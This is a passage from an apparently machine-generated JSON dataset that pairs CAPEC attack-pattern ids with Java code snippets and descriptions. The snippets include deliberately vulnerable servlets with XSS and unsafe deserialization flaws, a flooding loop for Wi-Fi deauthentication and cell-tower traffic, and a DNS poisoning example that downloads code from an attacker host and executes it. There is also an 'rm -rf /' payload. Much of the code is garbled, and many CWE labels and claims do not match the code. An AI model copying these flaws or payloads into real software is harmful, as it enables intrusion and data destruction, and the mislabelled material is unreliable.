        "code_snippet": "public class HardwareDisabler {\n    private static final String POWER_DOWN_COMMAND = \"poweroff\";\n    private static final String DEVICE_FILE = \"/dev/ttyUSB0\";\n\n    public static void main(String[] args) {\n        try {\n            // CWE-1334: Unauthorized Error Injection Can Degrade Hardware Redundancy\n            Process process = Runtime.getRuntime().exec(new String[]{\"sudo\", \"-S\", \"ip\", \"link\", \"set\", \"dev\", \"eth0\", \"down\"});\n            process.waitFor();\n\n            // CWE-1304: Improperly Preserved Integrity of Hardware Configuration State During a Power Save/Restore Operation\n            PowerManager powerManager = (PowerManager) getSystemService(Context.POWER_SERVICE);\n            powerManager.shutdown();\n\n            // CWE-1256: Improper Restriction of Software Interfaces to Hardware Features\n            File deviceFile = new File(DEVICE_FILE);\n            if (deviceFile.canWrite()) {\n                FileWriter fileWriter = new FileWriter(deviceFile);\n                fileWriter.write(POWER_DOWN_COMMAND);\n                fileWriter.close();\n            }\n\n            // CWE-1320: Improper Protection for Outbound Error Messages and Alert Signals\n            ErrorSignal errorSignal = new ErrorSignal();\n            errorSignal.disableAlerts();\n\n            // CWE-1276: Hardware Child Block Incorrectly Connected to Parent System\n            HardwareChildBlock hardwareChildBlock = new HardwareChildBlock();\n            hardwareChildBlock.connectToParentSystem();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC attack pattern of physically disabling networking hardware by powering it down or disconnecting critical equipment. It includes examples of CWE-1334, CWE-1304, CWE-1256, CWE-1320, and CWE-1276 vulnerabilities."
    },
    {
        "capec_id": "584",
        "code_snippet": "import java.net.*;\nimport java.io.*;\n\npublic class BGPAttack {\n    public static void main(String[] args) throws Exception {\n        // CWE-941: Incorrectly Specified Destination in a Communication Channel\n        DatagramSocket socket = new DatagramSocket();\n        InetAddress destination = InetAddress.getByName(\"malicious-AS\");\n        byte[] data = \"suppress BGP advertisement\".getBytes();\n        DatagramPacket packet = new DatagramPacket(data, data.length, destination, 179);\n        socket.send(packet);\n\n        // CWE-406: Insufficient Control of Network Message Volume (Network Amplification)\n        for (int i = 0; i < 1000; i++) {\n            socket.send(packet);\n        }\n\n        // CWE-927: Use of Implicit Intent for Sensitive Communication\n        // (Note: This CWE is specific to Android and cannot be directly translated to Java)\n\n        // CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n        Socket tcpSocket = new Socket(\"target-AS\", 179);\n        OutputStream outputStream = tcpSocket.getOutputStream();\n        outputStream.write(data);\n        outputStream.flush();\n\n        // CWE-757: Selection of Less-Secure Algorithm During Negotiation ('Algorithm Downgrade')\n        // (Note: This CWE is more relevant to SSL/TLS negotiations and cannot be directly translated to BGP)\n    }\n}",
        "description": "This Java code snippet demonstrates a BGP attack by suppressing the BGP advertisement for a route, rendering the underlying network inaccessible. It incorporates CWE-941 by sending a malicious packet to a destination AS, CWE-406 by amplifying the network traffic volume, and CWE-924 by not ensuring the integrity of the transmitted message. CWE-927 and CWE-757 are not directly applicable to this Java code snippet, but are included for context."
    },
    {
        "capec_id": "585",
        "code_snippet": "import java.net.URL;\nimport java.net.HttpURLConnection;\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\n\npublic class VulnerableCode {\n    public static void main(String[] args) throws Exception {\n        String userInput = \"http://example.com\";\n        String redirectUrl = getRedirectUrl(userInput);\n        if (redirectUrl != null) {\n            URL url = new URL(redirectUrl);\n            HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n            connection.setRequestMethod(\"GET\");\n            int responseCode = connection.getResponseCode();\n            if (responseCode == 200) {\n                BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));\n                String line;\n                while ((line = reader.readLine()) != null) {\n                    System.out.println(line);\n                }\n            }\n        }\n    }\n\n    private static String getRedirectUrl(String userInput) {\n        // CWE-350: Reliance on Reverse DNS Resolution for a Security-Critical Action\n        String hostname = getHostnameFromIP(userInput);\n        if (hostname != null) {\n            // CWE-942: Permissive Cross-domain Policy with Untrusted Domains\n            String crossDomainPolicy = getCrossDomainPolicy(hostname);\n            if (crossDomainPolicy != null) {\n                // CWE-368: Context Switching Race Condition\n                String redirectUrl = getRedirectUrlFromPolicy(crossDomainPolicy);\n                if (redirectUrl != null) {\n                    // CWE-601: URL Redirection to Untrusted Site ('Open Redirect')\n                    return redirectUrl;\n                }\n            }\n        }\n        return null;\n    }\n\n    private static String getHostnameFromIP(String ip) {\n        // Simulate reverse DNS resolution\n        return \"example.com\";\n    }\n\n    private static String getCrossDomainPolicy(String hostname) {\n        // Simulate cross-domain policy retrieval\n        return \"<cross-domain-policy><allow-access-from domain='*'/></cross-domain-policy>\";\n    }\n\n    private static String getRedirectUrlFromPolicy(String policy) {\n        // Simulate redirect URL retrieval from policy\n        return \"http://example.com/redirect\";\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC attack pattern where an adversary influences a target's web-hosting company to disable a target domain. The code relies on reverse DNS resolution to obtain the hostname, uses a permissive cross-domain policy with untrusted domains, and performs a context switch with a race condition. It also includes an open redirect vulnerability and a cross-site scripting vulnerability. The code is vulnerable to various attacks, including phishing and unauthorized access to the targeted service."
    },
    {
        "capec_id": "586",
        "code_snippet": "import java.io.ByteArrayInputStream; import java.io.ObjectInputStream; import java.io.Serializable; public class VulnerableApp { public static void main(String[] args) { String userInput = \"\"; // assume userInput comes from an untrusted source byte[] bytes = userInput.getBytes(); ByteArrayInputStream bis = new ByteArrayInputStream(bytes); ObjectInputStream ois = new ObjectInputStream(bis); Object obj = ois.readObject(); // deserialization without validation if (obj instanceof MaliciousObject) { MaliciousObject maliciousObj = (MaliciousObject) obj; maliciousObj.executeMaliciousCode(); } } } class MaliciousObject implements Serializable { private static final long serialVersionUID = 1L; public void executeMaliciousCode() { // malicious code execution Runtime.getRuntime().exec(\"rm -rf /\"); } }",
        "description": "This Java code snippet demonstrates the CAPEC of deserialization of untrusted data. The VulnerableApp class deserializes user input without validation, allowing an attacker to inject a malicious object. The MaliciousObject class contains sensitive data and can execute malicious code when deserialized. This code embodies CWE-502, CWE-1313, CWE-77, CWE-506, and CWE-499."
    },
    {
        "capec_id": "587",
        "code_snippet": "public class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest req, HttpServletResponse res) throws ServletException, IOException {\n        String iframeSrc = req.getParameter(\"iframeSrc\");\n        String scriptSrc = req.getParameter(\"scriptSrc\");\n        res.setContentType(\"text/html\");\n        PrintWriter out = res.getWriter();\n        out.println(\"<html><body>\");\n        out.println(\"<iframe src='\" + iframeSrc + \"' width='100%' height='100%'></iframe>\");\n        out.println(\"<script src='\" + scriptSrc + \"'></script>\");\n        out.println(\"</body></html>\");\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable servlet that can be exploited using the CAPEC attack pattern. The servlet takes two parameters, iframeSrc and scriptSrc, and injects them into an HTML page without proper validation or sanitization. This allows an attacker to inject malicious JavaScript and a legitimate webpage into a concealed iframe, leading to potential XSS and CSRF attacks."
    },
    {
        "capec_id": "588",
        "code_snippet": "public class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest req, HttpServletResponse res) throws ServletException, IOException {\n        String userInput = req.getParameter(\"userInput\");\n        String html = \"<div onmouseover=\\\"\" + userInput + \"\\\">\";\n        res.setContentType(\"text/html\");\n        PrintWriter out = res.getWriter();\n        out.println(html);\n    }\n}",
        "description": "This Java code snippet demonstrates a DOM-based XSS vulnerability. The servlet takes user input from the request parameter 'userInput' and injects it into the HTML response without proper validation or encoding. An attacker can inject malicious script code as the user input, which will be executed by the client-side browser when the page is loaded, allowing the attacker to manipulate the DOM."
    },
    {
        "capec_id": "589",
        "code_snippet": "import java.net.InetAddress;\nimport java.net.UnknownHostException;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class DNSInterceptor {\n    private Map<String, String> dnsCache = new HashMap<>();\n\n    public void interceptDNSRequest(String hostname) {\n        try {\n            InetAddress address = InetAddress.getByName(hostname);\n            String ip = address.getHostAddress();\n            // CWE-300: No verification of the identity of actors at both ends of the communication channel\n            // CWE-291: Using IP address for authentication\n            if (ip.equals(\"192.168.1.100\")) {\n                // Drop DNS request based on content in the request\n                System.out.println(\"DNS request dropped for \" + hostname);\n                return;\n            }\n            // CWE-350: Reliance on reverse DNS resolution for a security-critical action\n            String reverseDNS = address.getCanonicalHostName();\n            if (!reverseDNS.equals(hostname)) {\n                System.out.println(\"Reverse DNS resolution failed for \" + hostname);\n                return;\n            }\n            // CWE-1327: Binding to an unrestricted IP address\n            // CWE-412: Unrestricted externally accessible lock\n            dnsCache.put(hostname, ip);\n            System.out.println(\"DNS request allowed for \" + hostname);\n        } catch (UnknownHostException e) {\n            System.out.println(\"Unknown host: \" + hostname);\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a DNS interceptor that drops DNS requests based on content in the request, allowing an adversary to deny the availability of specific services or content to the user. The code embodies CWE-300 by not verifying the identity of actors at both ends of the communication channel, CWE-291 by using IP address for authentication, CWE-350 by relying on reverse DNS resolution for a security-critical action, CWE-1327 by binding to an unrestricted IP address, and CWE-412 by having an unrestricted externally accessible lock."
    },
    {
        "capec_id": "590",
        "code_snippet": "import java.net.*;\nimport java.io.*;\n\npublic class VulnerableServer {\n    public static void main(String[] args) throws IOException {\n        ServerSocket serverSocket = new ServerSocket(8080);\n        Socket socket = serverSocket.accept();\n        String clientIP = socket.getInetAddress().getHostAddress();\n        if (clientIP.equals(\"192.168.1.100\")) {\n            // authenticate based on IP address\n            System.out.println(\"Authenticated!\");\n            // perform privileged operation\n            System.out.println(\"Performing privileged operation...\");\n        } else {\n            System.out.println(\"Access denied!\");\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable server that authenticates clients based on their IP address (CWE-291) and does not properly restrict the communication channel to the intended endpoint (CWE-923). The server binds to all available network interfaces (0.0.0.0) (CWE-1327) and relies on the client to implement a mechanism that is intended to protect the server (CWE-602). An adversary can exploit this by dropping packets destined for the target IP address, preventing access to the service hosted at the target IP address, as described in the CAPEC."
    },
    {
        "capec_id": "591",
        "code_snippet": "public class ReflectedXSS {\n    public static void main(String[] args) {\n        String userInput = request.getParameter(\"input\"); // CWE-79\n        String html = \"<img src='\" + userInput + \"' />\";\n        // CWE-82: Incomplete neutralization of script in attributes of IMG tags\n        out.println(html);\n    }\n}\n\n// CWE-692: Incomplete denylist to Cross-Site Scripting\npublic class XSSFilter {\n    public static String filterInput(String input) {\n        // Incomplete denylist, allowing XSS variants to succeed\n        if (!input.contains(\"script\") && !input.contains(\"javascript\")) {\n            return input;\n        } else {\n            return \"\";\n        }\n    }\n}\n\n// CWE-84: Improper neutralization of encoded URI schemes in a web page\npublic class URIEncoder {\n    public static String encodeURI(String input) {\n        // Improper neutralization of user-controlled input for executable script disguised with URI encodings\n        return input.replace(\"javascript:\", \"\");\n    }\n}\n\n// CWE-81: Improper neutralization of script in an error message web page\npublic class ErrorPage {\n    public static void showErrorPage(String errorMessage) {\n        // Improper neutralization of special characters that could be interpreted as web-scripting elements\n        out.println(\"<h1>Error: \" + errorMessage + \"</h1>\");\n    }\n}",
        "description": "This Java code snippet demonstrates a reflected XSS vulnerability, where user input is not properly sanitized and is reflected back to the user, allowing an attacker to inject malicious scripts. The code includes examples of CWE-79, CWE-82, CWE-692, CWE-84, and CWE-81, which are all related to improper neutralization of input and script elements."
    },
    {
        "capec_id": "592",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\n@WebServlet(name = \"vulnerableServlet\", urlPatterns = {\"/vulnerableServlet\"})\npublic class VulnerableServlet extends HttpServlet {\n    @Override\n    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n        String userInput = req.getParameter(\"userInput\");\n        // CWE-79: No input validation or neutralization\n        String storedData = \"<img src='\" + userInput + \"' />\";\n        // CWE-692: Incomplete denylist, allowing XSS variants\n        if (!storedData.contains(\"<script>\") && !storedData.contains(\"javascript:\")) {\n            // CWE-1289: Improper validation of unsafe equivalence in input\n            resp.getWriter().write(\"Stored data: \" + storedData);\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable servlet that is susceptible to Stored Cross-Site Scripting (XSS). It receives user input, stores it without proper validation or neutralization, and then reflects it back to the user. The code lacks input validation, allowing malicious scripts to be stored and executed. The incomplete denylist and improper validation of unsafe equivalence in input further exacerbate the vulnerability."
    },
    {
        "capec_id": "593",
        "code_snippet": "import javax.servlet.http.HttpSession;\nimport java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class VulnerableSessionAuth extends HttpServlet {\n    @Override\n    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n        String username = req.getParameter(\"username\");\n        String password = req.getParameter(\"password\");\n\n        if (authenticate(username, password)) {\n            HttpSession session = req.getSession(true);\n            session.setAttribute(\"authenticated\", true);\n            // No session expiration or fixation protection\n            resp.sendRedirect(\"protected_area.jsp\");\n        } else {\n            resp.setStatus(401);\n        }\n    }\n\n    private boolean authenticate(String username, String password) {\n        // Insecure authentication mechanism, no password hashing or salting\n        return username.equals(\"admin\") && password.equals(\"password\");\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable session authentication mechanism, embodying the CAPEC and related CWEs. It lacks proper authentication, session fixation protection, and session expiration, allowing an adversary to steal or manipulate an active session and gain unauthorized access to the application."
    },
    {
        "capec_id": "594",
        "code_snippet": "import java.net.Socket;\nimport java.io.DataInputStream;\nimport java.io.DataOutputStream;\nimport java.net.ServerSocket;\n\npublic class VulnerableServer {\n    public static void main(String[] args) throws Exception {\n        ServerSocket serverSocket = new ServerSocket(8000);\n        Socket socket = serverSocket.accept();\n        DataInputStream input = new DataInputStream(socket.getInputStream());\n        DataOutputStream output = new DataOutputStream(socket.getOutputStream());\n\n        String request = input.readUTF();\n        // CWE-940: No verification of the source of the communication channel\n        // CWE-99: No restriction on the input before using it as a resource identifier\n        String resourceId = request.substring(0, request.indexOf(\" \"));\n        String message = request.substring(request.indexOf(\" \") + 1);\n\n        // CWE-319: Sensitive information transmitted in cleartext\n        output.writeUTF(\"Received request: \" + request);\n\n        // CWE-924: No enforcement of message integrity during transmission\n        // CWE-406: No control of network message volume\n        for (int i = 0; i < 10; i++) {\n            output.writeUTF(\"Response \" + i + \": \" + message);\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable server that accepts incoming requests and responds with a message. It does not verify the source of the communication channel, allowing an adversary to inject traffic and affect the system. The code also transmits sensitive information in cleartext, does not restrict input before using it as a resource identifier, and does not enforce message integrity during transmission. Additionally, it does not control the network message volume, making it vulnerable to network amplification attacks."
    },
    {
        "capec_id": "595",
        "code_snippet": "import java.net.Socket;\nimport java.net.ServerSocket;\nimport java.io.DataOutputStream;\nimport java.io.DataInputStream;\n\npublic class ConnectionResetAttack {\n    public static void main(String[] args) throws Exception {\n        ServerSocket serverSocket = new ServerSocket(8080);\n        Socket socket = serverSocket.accept();\n        DataOutputStream dos = new DataOutputStream(socket.getOutputStream());\n        DataInputStream dis = new DataInputStream(socket.getInputStream());\n\n        // CWE-940: Improper Verification of Source of a Communication Channel\n        // No verification of the source of the incoming request\n        String request = dis.readUTF();\n        System.out.println(\"Received request: \" + request);\n\n        // CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n        // No message integrity check\n        dos.writeUTF(\"Response from server\");\n\n        // CWE-941: Incorrectly Specified Destination in a Communication Channel\n        // Incorrectly specifying the destination\n        Socket socketToSpoof = new Socket(\"localhost\", 8081);\n        DataOutputStream dosToSpoof = new DataOutputStream(socketToSpoof.getOutputStream());\n        dosToSpoof.writeUTF(\"Spoofed response\");\n\n        // CWE-294: Authentication Bypass by Capture-replay\n        // Capturing and replaying the request\n        byte[] capturedRequest = request.getBytes();\n        dos.write(capturedRequest);\n\n        // CWE-605: Multiple Binds to the Same Port\n        // Binding multiple sockets to the same port\n        ServerSocket serverSocket2 = new ServerSocket(8080);\n        Socket socket2 = serverSocket2.accept();\n    }\n}\n",
        "description": "This Java code snippet demonstrates a connection reset attack, where an adversary injects a connection reset packet to one or both ends of a target's connection. The code includes vulnerabilities related to CWE-940, CWE-924, CWE-941, CWE-294, and CWE-605, making it susceptible to various attacks."
    },
    {
        "capec_id": "596",
        "code_snippet": "import java.net.Socket;\nimport java.net.URL;\nimport java.net.HttpURLConnection;\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\n\npublic class TCPResetAttack {\n    public static void main(String[] args) throws Exception {\n        // CWE-940: Improper Verification of Source of a Communication Channel\n        Socket socket = new Socket(\"target_host\", 80);\n        socket.getOutputStream().write(\"GET / HTTP/1.1\\r\\nHost: target_host\\r\\n\\r\\n\".getBytes());\n\n        // CWE-918: Server-Side Request Forgery (SSRF)\n        URL url = new URL(\"http://target_host/redirect?url=http://attacker_host/malicious_content\");\n        HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n        connection.setRequestMethod(\"GET\");\n        connection.connect();\n\n        // CWE-294: Authentication Bypass by Capture-replay\n        String request = \"GET / HTTP/1.1\\r\\nHost: target_host\\r\\nAuthorization: Basic QWxhZGprak=\";\n        socket.getOutputStream().write(request.getBytes());\n\n        // CWE-444: Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling')\n        String smuggledRequest = \"GET /smuggle HTTP/1.1\\r\\nHost: target_host\\r\\nContent-Length: 10\\r\\n\\r\\nSmuggled\";\n        socket.getOutputStream().write(smuggledRequest.getBytes());\n\n        // CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers ('HTTP Request/Response Splitting')\n        String splitRequest = \"GET /split HTTP/1.1\\r\\nHost: target_host\\r\\nContent-Length: 10\\r\\n\\r\\nSplit\\r\\nInjection\";\n        socket.getOutputStream().write(splitRequest.getBytes());\n\n        // Send TCP RST packet to terminate the connection\n        socket.getOutputStream().write(\"RST\".getBytes());\n    }\n}",
        "description": "This Java code snippet demonstrates a TCP RST attack, which injects one or more TCP RST packets to a target after the target has made a HTTP GET request. The goal of this attack is to have the target and/or destination web server terminate the TCP connection. The code incorporates multiple CWEs, including CWE-940, CWE-918, CWE-294, CWE-444, and CWE-113, to demonstrate the vulnerabilities that can be exploited in this attack."
    },
    {
        "capec_id": "597",
        "code_snippet": "public class FileAccessor {\n    public void accessFile(String filePath) {\n        try {\n            File file = new File(filePath);\n            if (file.exists()) {\n                System.out.println(\\",
        "description": "This Java code snippet demonstrates the vulnerability of path traversal. The `accessFile` method takes a file path as input and attempts to access the file. The method does not properly validate the input path, allowing an attacker to provide a path that traverses outside the intended directory. In the `main` method, the `accessFile` method is called with a path that uses the `../` sequence to access the `/etc/passwd` file, which is outside the intended directory. This code is vulnerable to CWE-23, CWE-36, CWE-22, CWE-73, and CWE-25."
    },
    {
        "capec_id": "598",
        "code_snippet": "import java.net.InetAddress;\nimport java.net.UnknownHostException;\nimport java.net.URL;\nimport java.net.HttpURLConnection;\n\npublic class DNSPoisoning {\n    public static void main(String[] args) throws Exception {\n        // CWE-350: Reliance on Reverse DNS Resolution for a Security-Critical Action\n        InetAddress addr = InetAddress.getByName(\"attacker-controlled-dns.com\");\n        String hostname = addr.getCanonicalHostName();\n        System.out.println(\"Resolved hostname: \" + hostname);\n\n        // CWE-941: Incorrectly Specified Destination in a Communication Channel\n        URL url = new URL(\"http://\" + hostname + \"/malicious-code\");\n        HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n        conn.connect();\n\n        // CWE-494: Download of Code Without Integrity Check\n        String code = new String(conn.getInputStream().readAllBytes());\n        Runtime.getRuntime().exec(code);\n\n        // CWE-601: URL Redirection to Untrusted Site ('Open Redirect')\n        String redirectUrl = \"http://\" + hostname + \"/redirect?to=http://evil.com\";\n        System.out.println(\"Redirecting to: \" + redirectUrl);\n\n        // CWE-918: Server-Side Request Forgery (SSRF)\n        URL ssrfUrl = new URL(redirectUrl);\n        HttpURLConnection ssrfConn = (HttpURLConnection) ssrfUrl.openConnection();\n        ssrfConn.connect();\n        System.out.println(\"SSRF Response: \" + ssrfConn.getResponseCode());\n    }\n}",
        "description": "This Java code snippet demonstrates a DNS poisoning attack, where an adversary sends a malicious DNS response to a target's route request. The code relies on reverse DNS resolution to obtain a hostname, which can be tampered with by an attacker. It then uses the resolved hostname to download and execute malicious code, redirect to an untrusted site, and perform a server-side request forgery (SSRF) attack."
    },
    {
        "capec_id": "599",
        "code_snippet": "import java.io.DataInputStream;\nimport java.io.DataOutputStream;\nimport java.net.Socket;\n\npublic class SatelliteCommunication {\n    public static void main(String[] args) throws Exception {\n        Socket socket = new Socket(\"satellite.example.com\", 8080);\n        DataOutputStream dout = new DataOutputStream(socket.getOutputStream());\n        DataInputStream din = new DataInputStream(socket.getInputStream());\n\n        // CWE-319: Cleartext transmission of sensitive information\n        String sensitiveData = \"TopSecretMessage\";\n        dout.writeUTF(sensitiveData);\n\n        // CWE-923: Improper restriction of communication channel to intended endpoints\n        String endpoint = \"attacker.example.com\";\n        dout.writeUTF(endpoint);\n\n        // CWE-924: Improper enforcement of message integrity during transmission\n        String message = \"MaliciousMessage\";\n        dout.writeUTF(message);\n\n        // CWE-927: Use of implicit intent for sensitive communication (Android-specific, not applicable in this Java example)\n\n        // CWE-1316: Fabric-Address Map Allows Programming of Unwarranted Overlaps of Protected and Unprotected Ranges (hardware-specific, not applicable in this Java example)\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable satellite communication system that embodies the CAPEC attack pattern. It transmits sensitive data in cleartext, fails to properly restrict the communication channel to the intended endpoint, and does not ensure message integrity during transmission. This code is vulnerable to jamming attacks, allowing an adversary to disrupt the communication channel and potentially inject malicious data."
    },
    {
        "capec_id": "600",
        "code_snippet": "public class CredentialStuffingExample {\n    private static final String[][] KNOWN_CREDENTIALS = {{\"user1\", \"password1\"}, {\"user2\", \"password2\"}, {\"user3\", \"password3\"}};\n    private static final String[] TARGET_SYSTEMS = {\"system1\", \"system2\", \"system3\"};\n\n    public static void main(String[] args) {\n        for (String targetSystem : TARGET_SYSTEMS) {\n            for (String[] credentials : KNOWN_CREDENTIALS) {\n                String username = credentials[0];\n                String password = credentials[1];\n                boolean authenticated = authenticate(targetSystem, username, password);\n                if (authenticated) {\n                    System.out.println(\"Authenticated to \" + targetSystem + \" with credentials: \" + username + \"/\" + password);\n                    // Perform malicious actions\n                }\n            }\n        }\n    }\n\n    private static boolean authenticate(String system, String username, String password) {\n        // Simple authentication mechanism without any protection\n        if (username.equals(\"admin\") && password.equals(\"password\")) {\n            return true;\n        }\n        return false;\n    }\n}",
        "description": "This Java code snippet demonstrates a Credential Stuffing attack, where an adversary tries known username/password combinations against different systems, applications, or services to gain additional authenticated access. The code uses a simple authentication mechanism without any protection, making it vulnerable to brute force attacks and unauthorized access. The CWEs embodied in this code snippet include CWE-522 (Insufficiently Protected Credentials), CWE-307 (Improper Restriction of Excessive Authentication Attempts), CWE-308 (Use of Single-factor Authentication), CWE-309 (Use of Password System for Primary Authentication), CWE-262 (Not Using Password Aging), CWE-263 (Password Aging with Long Expiration), and CWE-654 (Reliance on a Single Factor in a Security Decision)."
    },
    {
        "capec_id": "601",
        "code_snippet": "import java.net.*;\nimport java.io.*;\n\npublic class VulnerableRadioNoise {\n    public static void main(String[] args) throws Exception {\n        DatagramSocket socket = new DatagramSocket(12345);\n        byte[] buffer = new byte[1024];\n        DatagramPacket packet = new DatagramPacket(buffer, buffer.length);\n\n        // CWE-923: Improper Restriction of Communication Channel to Intended Endpoints\n        // No validation of the sender's IP address\n        while (true) {\n            socket.receive(packet);\n            String message = new String(packet.getData(), 0, packet.getLength());\n            System.out.println(\"Received message: \" + message);\n\n            // CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n            // No message integrity check\n            processMessage(message);\n        }\n    }\n\n    private static void processMessage(String message) {\n        // CWE-319: Cleartext Transmission of Sensitive Information\n        // Sensitive information is sent in cleartext\n        sendResponseOverCleartextChannel(message);\n    }\n\n    private static void sendResponseOverCleartextChannel(String message) {\n        try {\n            Socket socket = new Socket(\"example.com\", 8080);\n            OutputStream outputStream = socket.getOutputStream();\n            outputStream.write(message.getBytes());\n            outputStream.close();\n            socket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable radio noise attack. It establishes a communication channel and receives messages without validating the sender's IP address (CWE-923) or ensuring message integrity (CWE-924). It then processes the message and sends a response over a cleartext channel (CWE-319), making it susceptible to eavesdropping and tampering. The code does not control network message volume (CWE-406), allowing an adversary to overwhelm system resources with illegitimate traffic. Additionally, the code is vulnerable to race conditions during access to alternate channels (CWE-421)."
    },
    {
        "capec_id": "602",
        "code_snippet": "import java.net.InetAddress;\nimport java.net.UnknownHostException;\n\npublic class VulnerableCode {\n    public static void main(String[] args) {\n        try {\n            InetAddress inetAddress = InetAddress.getByName(\"example.com\");\n            String hostAddress = inetAddress.getHostAddress();\n            // Using an obsolete function\n            String deprecatedFunctionResult = inetAddress.getLocalHost().getHostName();\n            System.out.println(\"Host Address: \" + hostAddress);\n            System.out.println(\"Deprecated Function Result: \" + deprecatedFunctionResult);\n            // Reliance on DNS Lookups in a Security Decision\n            if (hostAddress.equals(\"127.0.0.1\")) {\n                // Grant access\n                System.out.println(\"Access Granted\");\n            } else {\n                // Deny access\n                System.out.println(\"Access Denied\");\n            }\n        } catch (UnknownHostException e) {\n            System.out.println(\"Unknown Host Exception: \" + e.getMessage());\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a deprecated attack pattern that incorporates multiple weaknesses. It uses an obsolete function (InetAddress.getLocalHost().getHostName()) and relies on DNS lookups for security decisions, which can lead to authentication bypass issues. The code has not been actively reviewed or maintained, making it vulnerable to stored data modification."
    },
    {
        "capec_id": "603",
        "code_snippet": "public class ResourceAllocator {\n    private static final List<Object> resources = new ArrayList<>();\n    \n    public static void allocateResource() {\n        while (true) {\n            Object resource = new Object();\n            resources.add(resource);\n        }\n    }\n    \n    public static void main(String[] args) {\n        Thread allocator = new Thread(ResourceAllocator::allocateResource);\n        allocator.start();\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of blocking the delivery of an important system resource, causing the system to fail or stop working. It allocates objects in an infinite loop, leading to uncontrolled resource consumption (CWE-400), without imposing any restrictions on the size or number of resources that can be allocated (CWE-770). This can cause the system to eventually run out of memory, leading to a failure. The lack of protection mechanisms to prevent this allocation (CWE-693) and the creation of emergent resources (CWE-1229) further exacerbate the issue. Additionally, if this code is running on a redundant system, an unauthorized agent could inject errors to deprive the system of redundancy (CWE-1334)."
    },
    {
        "capec_id": "604",
        "code_snippet": "import java.net.DatagramSocket;\nimport java.net.InetAddress;\nimport java.net.SocketException;\nimport java.net.UnknownHostException;\n\npublic class WiFIDoS {\n    public static void main(String[] args) {\n        try {\n            DatagramSocket socket = new DatagramSocket();\n            InetAddress address = InetAddress.getByName(\"<target_wifi_ip>\");\n            byte[] deauthFrame = {(byte) 0xC0, (byte) 0x00, (byte) 0x3A, (byte) 0x01, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0xFF, (byte) 0xFF, (byte) 0xFF, (byte) 0xFF, (byte) 0xFF, (byte) 0xFF};\n            while (true) {\n                socket.send(new DatagramPacket(deauthFrame, deauthFrame.length, address, 8080));\n            }\n        } catch (SocketException e) {\n            System.out.println(\"Error creating socket: \" + e.getMessage());\n        } catch (UnknownHostException e) {\n            System.out.println(\"Error resolving target WiFi IP: \" + e.getMessage());\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a Wi-Fi denial-of-service (DoS) attack by continuously sending deauthentication frames to a target Wi-Fi network, effectively preventing users from transmitting or receiving data. The code does not properly verify the source of the communication channel (CWE-940), does not ensure message integrity during transmission (CWE-924), and does not restrict the communication channel to the intended endpoint (CWE-923). Additionally, the code transmits sensitive information (deauthentication frames) in cleartext, making it vulnerable to sniffing by unauthorized actors (CWE-319)."
    },
    {
        "capec_id": "605",
        "code_snippet": "import java.io.IOException;\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\nimport java.net.SocketException;\n\npublic class CellularDisruptor {\n    public static void main(String[] args) throws SocketException {\n        DatagramSocket socket = new DatagramSocket();\n        InetAddress cellTowerAddress = InetAddress.getByName(\"celltower.example.com\");\n        byte[] falseStatusMessage = \"OVERWHELMING FALSE STATUS MESSAGE\".getBytes();\n\n        while (true) {\n            try {\n                DatagramPacket packet = new DatagramPacket(falseStatusMessage, falseStatusMessage.length, cellTowerAddress, 12345);\n                socket.send(packet);\n                // No verification of source or integrity of the channel\n                // No encryption or protection of sensitive information\n                // No mechanism to prevent physical side channels\n            } catch (IOException e) {\n                System.out.println(\"Error sending packet: \" + e.getMessage());\n            }\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a cellular disruptor that sends false status messages to a cell tower, overwhelming it and disrupting communication. It does not verify the source or integrity of the channel, does not encrypt or protect sensitive information, and does not prevent physical side channels, making it vulnerable to CWE-924, CWE-1300, CWE-300, CWE-940, and CWE-319."
    },
    {
        "capec_id": "606",
